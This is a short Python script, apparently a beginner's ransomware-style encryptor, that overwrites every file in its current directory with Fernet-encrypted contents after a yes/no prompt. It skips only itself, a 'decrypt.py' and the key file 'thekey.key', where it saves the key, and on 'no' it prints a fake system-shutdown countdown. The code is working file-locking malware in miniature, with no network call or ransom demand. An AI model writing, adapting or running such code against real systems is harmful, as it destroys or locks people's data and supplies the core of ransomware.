import os
from cryptography.fernet import Fernet
import sys
import time

os.system('CLS')

def main():
    files = []
    for file in os.listdir():
        if file == "skrypt.py" or file == "thekey.key" or file == "decrypt.py":
            continue
        if os.path.isfile(file):
            files.append(file)

    key = Fernet.generate_key()
        
    with open("thekey.key", "wb") as thekey:
        thekey.write(key)
        
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
            contents_encrypted = Fernet(key).encrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(contents_encrypted)
                
a_1 = input("Are you sure to encrypt files? (yes/no) \n")

if a_1 == "yes":
    main()
else:
    os.system('CLS')
    for i in range(10, 0, -1):
        print(f"System shutdown... {i}")
        time.sleep(1)
    print("")
    print("Goodbye :)")
    sys.exit()
